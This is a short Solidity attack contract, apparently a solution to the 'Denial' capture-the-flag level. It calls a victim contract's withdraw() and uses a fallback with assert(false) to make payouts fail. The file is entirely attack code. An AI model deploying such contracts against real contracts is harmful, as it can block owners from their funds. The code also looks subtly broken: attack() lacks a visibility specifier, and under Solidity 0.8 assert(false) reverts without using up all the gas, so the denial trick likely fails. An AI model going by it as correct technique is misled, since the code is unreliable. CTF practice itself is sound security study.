pragma solidity ^0.8.11;

import "./Denial.sol";

contract DenialAttack {
    Denial private _victim;

    constructor(address payable victim) {
        _victim = Denial(victim);
    }

    function attack() {
        _victim.withdraw();
    }

    fallback() external payable {
        assert(false);
    }
}
